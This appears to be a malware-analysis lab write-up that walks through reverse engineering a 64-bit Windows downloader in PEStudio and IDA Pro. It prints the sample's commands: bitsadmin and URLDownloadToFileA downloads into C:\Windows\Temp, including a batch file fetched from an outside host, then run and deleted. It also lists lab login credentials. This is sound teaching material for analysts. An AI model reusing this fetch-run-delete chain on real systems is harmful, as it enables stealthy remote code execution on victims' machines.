# Lab 12 - Reverse Engineering a 64-bit Downloader using IDA Pro

---

## Scenario

You have been called by a client to examine a weird sample that was found on one of their developer’s systems. The client thinks this sample could be hiding its true nature of activity.

<br/>

The goal of this lab is to understand how to both debug and reverse engineer a downloader which is widely used by different threat actors.

<br/>

After completing this lab, you will be able to use a disassembler such as IDA Pro to reverse engineer a downloader. You will also use a debugger such as x64dbg to debug the same downloader and understand what malicious activity is being carried by this downloader.

<br/>

192.168.210.10 / AdminELS / Nu3pmkfyX

<br/>

---

## Tools

- x64dbg (or any other 64-bit debugger) 
- IDA Pro (we are using the free version) 
- pestudio (9.0.2) or any other PE Analyzer

<br/>

---

## Task 1: General Sample Info

**Question**

Use a PE file analyzer to extract as much information you can to help you with the reverse engineering process.

<br/>

**Answer**

Open **Downloader.exe** in **PEStudio**:

![picture 369](images/dd32dd2ae2ac9dd1696b15cbe69e9c2e54442c0adcd6d0f14dc64930ee23c0cc.png)  

- MD5: 0F57C9201984E46D8AEFE1113828D645
- SHA1: EA26217E97B1024311E3359C85EDDBEDDC603682
- SHA256: F1E6E24655960818A1CBAFF3641AC5CB22FF26ED0EB86986B68CEB10C1F611A4
- PE file (`MZ` / `0x4d5a`)
- 64-bit
- Console application

<br/>

Navigate to **Libraries**:

![picture 370](images/5389c234ca76a54c2bdfe27c15740e5d0626b7689f411222d085797993208ad7.png)  

- urlmon.dll - network connectivity (`URLDownloadToFileA`)
- kernel32.dll
- shell32.dll

<br/>

Check **imports**:

![picture 371](images/6b0e5fad68ac6e0e9381f1ef9ad4c4ead38d7105adbc6ae10f95ff6934ff7d66.png)  

- URLDownloadToFileA
- ShellExecuteA

<br/>

Check **manifest**:

![picture 372](images/f840587975b16c5555c9ee09b45f687f5de5698e92aa31ed4dc511a526b04c5a.png)  

- The program requires Administrator privilege

<br/>

Check **Strings**:

![picture 373](images/0abea42d36b9fb52a6276a82c5cda3600de7636c0b6fb51c2ff5626ef39cc8f0.png)  

- (0x1420) `/C bitsadmin.exe /transfer IND1 /download /priority high https://download.sysinternals.com/files/ShellRunas.zip C:\Windows\Temp\1.zip`
- (0x14A8) `cmd.exe`
- (0x14B8) `c:\Windows\Temp\`
- (0x14D0) `/C tar.exe -xf C:\Windows\Temp\1.zip && del /F c:\Windows\Temp\1.zip`
- (0x1518) `2.zip`
- (0x1520) `https://download.sysinternals.com/files/Autoruns.zip`
- (0x1560) `/C tar.exe -xf C:\Windows\Temp\2.zip && del /F c:\Windows\Temp\2.zip`
- (0x15B0) `/C bitsadmin.exe /transfer IND2 /download /priority high http://www.elsmap.com/file.bat C:\Windows\Temp\file.bat`
- (0x1628) `/C C:\Windows\Temp\file.bat && del /F c:\Windows\Temp\file.bat`

<br/>

---

## Task 2: Locating Main Function

**Question**

Use a disassembler and try to locate where is the main function of this sample.

<br/>

**Answer**

Run **IDA Pro 64-bit** as admin and load the sample:

![picture 374](images/024d903f3992c0c7f3926cddaf0f53eab63acdbaa86e0bc84801e2cb208901ea.png)  

- Leave all as default

![picture 375](images/3a536cbbfe77e6897b442b84e02cdaf942ff73bab64086b40b05e38ec9ef16db.png)  

- IDA will place you at the function that it believes based on its analysis is the start of this program. 
- Note even though we write some code in C/C++ and it starts with `main()` function, this is not the first thing that will be executed, there are many other things that get loaded and executed before main, many as IDA consider that “start”

<br/>

First go to the **Imports** tab:

![picture 376](images/44fc185fb10808c5fe0ff76d957eef3144f0c3b844a80fa2acd03cb6dbedfbfa.png)  

- Many unimportant libraries - MS C's runtime libraries

<br/>

To filter, right-click inside the import tab and click `Modify filters` (`Ctrl + Shift + F`):

![picture 377](images/48bf31afa829f98feb10638a8a8b2282ce2407c07b2833ae653ccb41484bbc7a.png)  

<br/>

Add filter:

- `If column Library contains api- then exclude`
- `If column Library contains VCRUNTIME then exclude`

![picture 379](images/29d6f4314e761c6d031223f4620b3563732f30e981b37d68c111448f3ae9f764.png)  

![picture 380](images/b6ad4766bc7c67f5898f51e0d2e7c059a82f2c0e44b664858ec69b8c1558f766.png)  


<br/>

Then navigate to `View > Open subviews > Strings` (`Shift + F12`):

![picture 381](images/3e930fc82211f5bbbc1659c54671e3fddd3dedd2441f36cdf57cf22a268f76df.png)  

- Same when doing Static Analysis

<br/>

In the **Function Window** on the left, double click `start`:

![picture 382](images/8470f35334b48cb8988001b3fc98fada700af56d8588b69a585fda31c2636843.png)  

- 2 function calls: `__security_init_cookie` and `?__scrt_common_mai_seh@@YAHXZ`

<br/>

Double click `__security_init_cookie`, which brings us to the function:

![picture 383](images/ddbbd8b53ba7caf360364b963b20d189f137f992b95499c8ffa63aa3c9f4d1ea.png)  


- Reference: http://uninformed.org/index.cgi?v=7&a=2&p=5
- Added by the Microsoft Visual Studio Compiler
- Generate the cookie that will be placed in the stack frame of a function call
- It is added at the beginning of the executable to protect the whole executable, so it is actually being called before the entry-point of the program, which we see in different PE analyzers is being called

Note:
You can rename the functoin by selecting the name of the function and then press `N`

<br/>

Move on to `?__scrt_common_mai_seh@@YAHXZ`:

![picture 384](images/2e96ae43ec3eeae9933f1eb659fd8d3c7959d4a8ccc661c4740a54316d994e55.png)  

<br/>

Also we can see in the **Graph Overview Window** at the bottom left - this gives you an idea of what this function flow looks like.

![picture 385](images/e2942562fa2e330ea7ba449faeca6a063dde03798ee280336fd022e904e59fcd.png)  

<br/>

Locate the main function by the keyword `_get initial_narrow_environment`:

![picture 386](images/d64dc3b46e0a1cb3319f817fb73b280a11dcafbfe7bcec4e314a931a976bd606.png)  

![picture 388](images/9803d23f2bb266ed0e76c7a56b699205c013f4c381d4df25f4f4c415d6a2a5ef.png)  


- These are the arguments passed to the main function `int main(int argc, char *argv[], char *envp[])`
- `r8` holds the value of `*envp[]`
- `rdx` holds the value of `*argv[]`
- `ecx` holds the value of `argc`
- `main` is a call to `main`

<br/>

Double click `main`, it shows the assembly of the main function.

![picture 389](images/7c874627e6173ff5071ea220b14a0e273aed88674dd1db073c70acd8f9f3f78d.png)  


<br/>

---

## Task 3: Reverse Engineering Main Function

**Question**

Reverse engineer the sample to understand what it is doing. Document all the function calls used and how they are being used. Use MSDN for referencing and understanding the functions you find.

<br/>

**Answer**

### Main Block

First note the **Graph Overview**:

![picture 390](images/551e70eaec51bb10f6a2c7d23e8fca12dedfc8193513eada8e24000e31a38ea6.png)  

<br/>

Look at the first block:

![picture 391](images/62756adc9447d2c841b265b570396ea3f026c1cd9758951cb917c4f65675d8c4.png)  

- The **functoin prologue** (Stack Frame Preparation)
- A number of parameters passed
- A call to a Windows API called `ShellExecuteA`, which is used to perform a specific operatin on a file (e.g. open a file)

```C++
HINSTANCE ShellExecuteA(
  HWND   hwnd,
  LPCSTR lpOperation,
  LPCSTR lpFile,
  LPCSTR lpParameters,
  LPCSTR lpDirectory,
  INT    nShowCmd
);
```

<br/>

From the code and the details of `ShellExecuteA`:

- `r9 > Parameters > /C bitsadmin.exe /transfer ...`
- `[rsp+38h+nShowCmd] > ebx > 0`
- `r8 > File > cmd.exe`
- `rds > Operation > Open`
- `[rsp+38h+lpDirectory] > rbx > lpDirectory > 0`
- `ecx > 0 > hwnd`

<br/>

Note:
Note the first 4 parameters of a function in a 64-bit program are passed by the registers `rcx`, `rdx`, `r8` and `r9` respectively, and everything else is **on the stack**. Which means:
- `rcx` holds the **handle** --> `hwnd` (A handle to a window)
- `rdx` holds the **lpOperation** --> `open`
- `r8` holds the **lpFile** --> `cmd.exe`
- `r9` holds the `lpParameters` --> Parameters
- Everything else on the `stack` --> `lpDirectory` which is 0 and `nShowCmd` which is also 0

<br/>

We can also double click on the **label Parameters** and it takes you to the details. For example:

![picture 393](images/e1b01307c097a1da7cc21e2b375d6eb887ea76b3f6521c71de2faadf97b7e2df.png)  


We can also hover over the label parameters to see the value assigned:

![picture 392](images/ac5394ba7d7716b637b51896d4fa24b223f55834a9a562e6f0dc4862d5d436b4.png)  

<br/>

These let us understand that `ShellExecuteA` is being used to call `cmd.exe`. which is used to execute `bitsadmin.exe /transfer IND1 /ownload /priority high https://download.sysinternals.com/files/ShellRunas.zip C:\Windows\Temp\1.zip`.

<br/>

After calling `ShellExecuteA`, the main block has an assignmnet:

- `lea rdi, Directory`
- `rdi` --> `Directory` --> `c:\\Windows\\Temp\\`

<br/>

### Next to Main block (Block 0)

![picture 394](images/e551982246921b21764248713eb998e94995d08a59c1869b13aff0c0d77a70cb.png)  

- First we see there are 2 Windows API calls - `Sleep` and `ShellExecuteA`.

<br/>

Here is the API document of `sleep` for https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleep:

```C++
void Sleep(
  DWORD dwMilliseconds
);
```

- It takes 1 parameter - the time interval for which execution is to be suspended
- Referring to the assembly, `mov ecx, 1388h`
- `1388h` = 0x1388 = 5000 - which means the program will sleep for `5000 ms`

<br/>

Next is the function call `ShellExecute` again:

- `r9` --> `aCTarExeXfCWind` --> `/C tar.exe -xf C:\\Windows\\Temp\\1.zip....`
- `[rsp+38h+nShowCmd]` --> `ebx` --> 0
- `r8` --> `File` --> `cmd.exe`
- `[rsp+38h+lpDirectory]` --> `rdi` --> `lpDirectory` --> `c:\\Windows\\Temp\\` (From the assignment in the last block)
- `rdx` --> `Operation` --> `open`
- `ecx` --> 0 --> `hwnd`

<br/>

Based on this analysis, `ShellExecuteA` is used to open `cmd.exe`, which executes `/C tar.exe -xf C:\Windows\Temp\1.zip && del /F c:\Windows\Temp\1.zip`.

<br/>

### Block 1

![picture 395](images/5e2855a9d321d756553ed27fef411955f1886e639f7c92773c2230490e55111f.png)  

- First we see a function call `URLDownloadToFileA`
- Note: URLDownloadToFile**A** = ANSI
- Note: URLDownloadToFile**W** = Unicode
- https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)

```C++
HRESULT URLDownloadToFile(
             LPUNKNOWN            pCaller,
             LPCTSTR              szURL,
             LPCTSTR              szFileName,
  _Reserved_ DWORD                dwReserved,
             LPBINDSTATUSCALLBACK lpfnCB
);
```

<br/>

Here is the assignment:

- (`xor r9d, r9d`) --> `r9d` --> 0
- `[rsp+38h+lpDirectory] --> rbx
- `r8` --> `a2Zip` --> `2.zip`
- `rdx` --> `aHttpsDownloadS` --> `https://download.sysinternals.com/files/Autoruns.zip`
- (`xor ecx, ecx`) --> `ecx` --> 0

<br/>

So regarding to the parameters to the `URLDownloadToFileA` call:

- `r9d` --> 0 (NULL) --> pCaller
- `rdx` --> `https://download.sysinternals.com/files/Autoruns.zip` --> szURL
- `r8` --> `2.zip` --> szFileName
- `r9` --> NULL --> dwReserved
- `rbx` --> LPBINDSTATUSCALLBACK --> lpfnCB

<br/>

Therefore, the sample use `URLDownloadToFileA` to downlaod the file from `https://download.sysinternals.com/files/Autoruns.zip`, and save it as `2.zip`.

<br/>

### Block 2

![picture 396](images/81f7fd677ca83df60a7f0f6a887083abbd175dabefc380f09529368b3fbc2880.png)  

- `Sleep` call
- Another `ShellExecuteA` call

<br/>

- (`mov ecx, 1388h`; `cs:Sleep`) --> Sleep for 5000 ms
- (`lea r9, aCTarExeXfCWind_0`) --> `r9` --> `aCTarExeXfCWind_0` -->  `/C tar.exe -xf C:\Windows\Temp\2.zip && del /F c:\Windows\Temp\2.zip`
- (`[rsp+38h+nShowCmd], ebx`) --> 0
- (`lea r8, File`) --> `r8` --> `File` --> `cmd.exe`
- (`[rsp+38h+lpDirectory], rdi`) --> lpDirectory
- (`lea rdx, Operation`) --> `rdx` --> `Operation` --> Open
- (`xor ecx, ecx`) --> `ecx` --> 0 --> hwnd

<br/>

The sample opens `cmd.exe` to run `/C tar.exe -xf C:\Windows\Temp\2.zip && del /F c:\Windows\Temp\2.zip`.

<br/>

### Block 3

![picture 397](images/c4a75aa644bbebcccf8e681ada1c47cec38b773b9c0fda39b69a583c3245e3b4.png)  

- Call `ShellExecuteA`

<br/>

Open `cmd.exe` to run `/C bitsadmin.exe /transfer IND2 /download /priority high http://www.elsmap.com/file.bat C:\Windows\Temp\file.bat` - Download `file.bat` from `www.elsmap.com` and save it to `C:\Windows\Temp\file.bat`.

<br/>

### Block 4

![picture 398](images/2c77d24c484e231f000e5f742a0060339b9b3d7327ee4cf04dc87e0c5771c008.png)  

- Call `Sleep` and `ShellExecuteA`

<br/>

Open `cmd.exe` to run `/C C:\Windows\Temp\file.bat && del /F c:\Windows\Temp\file.bat`. It basically run the batch file `file.bat` and delete it afterwards.

<br/>

However, for the function of `file.bat`, basically we do not know at time point. It is better to understand this in dynamic analysis.

<br/>

### Last block of Main function

![picture 399](images/9b51272ce6c9277e63323c9bb916fdb64244ac85e873b51564bf9df4406963e3.png)  



<br/>

---